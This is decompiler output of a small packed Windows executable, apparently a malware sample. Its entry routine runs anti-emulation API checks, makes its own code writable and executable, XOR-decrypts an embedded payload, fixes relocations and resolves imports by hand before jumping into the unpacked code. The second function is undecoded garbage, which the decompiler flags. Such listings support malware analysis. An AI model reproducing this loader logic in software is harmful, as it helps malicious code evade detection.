/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>);
// void __usercall sub_401DA8(int@<edx>, int _ECX@<ecx>, int@<ebp>, int *@<esi>);

//-------------------------------------------------------------------------
// Data declarations

char byte_4015C8[] = { 'ø' }; // weak
int dword_4028C8[206] =
{
  440519018,
  -1279460600,
  1636710663,
  1664517996,
  -937365384,
  1750548260,
  1693246332,
  1970127200,
  -670023890,
  1979408101,
  -2010911660,
  2131925083,
  -20402122,
  1412065750,
  519783691,
  198040139,
  -2017164940,
  -698744965,
  -32777551,
  -861852371,
  1014858812,
  -2107546456,
  -78551501,
  875807576,
  -391748754,
  -892833980,
  874872431,
  1407439641,
  -516785953,
  -1799256672,
  -1076531084,
  1727394106,
  1245469565,
  -726593048,
  -1884355295,
  -230651150,
  -672015616,
  545059673,
  -1981169259,
  1763717577,
  1800048636,
  -1040844333,
  1635858156,
  1837492828,
  2087372809,
  -787270112,
  2067091482,
  -2013863143,
  1913886368,
  -208224948,
  1508664440,
  671893709,
  1020329307,
  -1326270909,
  -802621082,
  -129573693,
  -890492047,
  195933116,
  -1249488055,
  -1017163320,
  208927586,
  -789751000,
  -222931140,
  214451888,
  1793977313,
  -669367863,
  -1380729605,
  -2041362165,
  1599195317,
  1945854659,
  -312793076,
  -1235796784,
  -934891278,
  -303308532,
  440519018,
  -1279460392,
  1397296045,
  1372108166,
  -77413537,
  1529351283,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAllAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern DWORD (__stdcall *AddUsersToEncryptedFile)(LPCWSTR lpFileName, PENCRYPTION_CERTIFICATE_LIST pEncryptionCertificates);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
char byte_404000[512] =
{
  '¹',
  'Æ',
  'â',
  '‘',
  '\'',
  '\x1A',
  'ö',
  '\x9D',
  '|',
  '8',
  'z',
  'Œ',
  '\x02',
  'Æ',
  '+',
  '!',
  '\'',
  ' ',
  '\x03',
  '‹',
  'Ð',
  '\x12',
  '1',
  'v',
  'y',
  'g',
  'Á',
  'ƒ',
  '™',
  'L',
  '\x7F',
  '\x02',
  '›',
  '•',
  '\t',
  '¨',
  '1',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
DWORD __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ebp
  DWORD result; // eax
  int v5; // edx
  unsigned int v6; // eax
  unsigned int v7; // ecx
  char *v8; // ebx
  int *v9; // edi
  HMODULE LibraryA; // ebp
  _WORD *v11; // esi
  char *v12; // eax
  bool v13; // zf
  int *v14; // esi
  int v15; // edi
  int v16; // eax
  char *v17; // edi
  FARPROC *v18; // esi
  bool v19; // sf
  FARPROC ProcAddress; // eax
  int v21; // edx
  int v22; // ecx
  DWORD flOldProtect; // [esp+4h] [ebp-Ch] BYREF
  unsigned int i; // [esp+8h] [ebp-8h]
  unsigned int v25; // [esp+Ch] [ebp-4h]

  v3 = 0;
  i = 37;
  result = AddUsersToEncryptedFile(0, 0);
  if ( result )
  {
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      i = 43;
    VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
    v6 = 0;
    while ( 1 )
    {
      a3 = v5 + 2 * a3;
      if ( v3 == i )
        v3 = 0;
      a1 = a3 + 8 * a1;
      byte_4015C8[v6] ^= byte_404000[v3] ^ 0xCA;
      a2 = v5 + 8 * a2;
      ++v6;
      ++v3;
      if ( v6 >= 0x1440 )
      {
        v7 = 0;
        v8 = &byte_4015C8[-640];
        v9 = dword_4028C8;
        LibraryA = (HMODULE)&byte_4015C8[-268436096];
        v25 = 0;
        while ( 1 )
        {
          v5 *= 9;
          v11 = v9 + 2;
          if ( (unsigned int)(v9[1] - 8) >> 1 )
          {
            i = (unsigned int)(v9[1] - 8) >> 1;
            do
            {
              v7 *= 3;
              LOWORD(v5) = *v11 & 0xF000;
              if ( (_WORD)v5 == 12288 )
              {
                v5 += (int)v11;
                v12 = &v8[*v9 + (*v11 & 0xFFF)];
                *(_DWORD *)v12 += LibraryA;
              }
              ++v11;
              --i;
            }
            while ( i );
            v7 = v25;
          }
          v7 += v9[1];
          v25 = v7;
          v9 = (int *)((char *)v9 + v9[1]);
          if ( v7 >= 0xE4 )
          {
            v13 = *(_DWORD *)&byte_4015C8[2812] == 0;
            v14 = (int *)&byte_4015C8[2796];
            for ( i = (unsigned int)&byte_4015C8[2796]; !v13; i = (unsigned int)v14 )
            {
              LibraryA = LoadLibraryA(&v8[v14[3]]);
              if ( LibraryA )
              {
                v15 = *v14;
                if ( !*v14 )
                  v15 = v14[4];
                v16 = *(_DWORD *)&v8[v15];
                v17 = &v8[v15];
                v18 = (FARPROC *)&v8[v14[4]];
                v19 = v16 < 0;
                if ( v16 )
                {
                  do
                  {
                    if ( v19 )
                    {
                      ProcAddress = GetProcAddress(LibraryA, (LPCSTR)*(unsigned __int16 *)v17);
                      v5 = v21 + v22;
                    }
                    else
                    {
                      ProcAddress = GetProcAddress(LibraryA, &v8[v16 + 2]);
                    }
                    v17 += 4;
                    *v18 = ProcAddress;
                    v16 = *(_DWORD *)v17;
                    ++v18;
                    v19 = *(int *)v17 < 0;
                  }
                  while ( *(_DWORD *)v17 );
                }
                v14 = (int *)i;
              }
              v14 += 5;
              v13 = v14[4] == 0;
            }
            sub_401DA8(v5, (int)sub_401DA8, (int)LibraryA, v14);
            ExitProcess(0);
          }
        }
      }
    }
  }
  return result;
}
// 401060: variable 'v5' is possibly undefined
// 40116D: variable 'v21' is possibly undefined
// 40116D: variable 'v22' is possibly undefined
// 4028C8: using guessed type int dword_4028C8[206];

//----- (00401DA8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_401DA8(int a1@<edx>, int _ECX@<ecx>, int a3@<ebp>, int *a4@<esi>)
{
  int v4; // ebp
  int v6; // edx
  char v7; // t0
  __int16 v8; // [esp-8h] [ebp-8h]

  v4 = a3 - 1;
  _EAX = *a4;
  __asm { arpl    [ecx], cx }
  v6 = a1 + 1;
  v7 = BYTE1(_EAX);
  BYTE1(_EAX) = *MK_FP(v8, v4 - 1019915870);
  *MK_FP(v8, v4 - 1019915870) = v7;
  *(_DWORD *)(v6 + 2 * _EAX) -= _ECX;
  LOBYTE(_EAX) = v6;
  __asm
  {
    aaa
    retf
  }
}
// 401DBF: positive sp value 8 has been found
// 401DC8: unbalanced stack, ignored a potential tail call
// 401DB3: variable 'v8' is possibly undefined

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
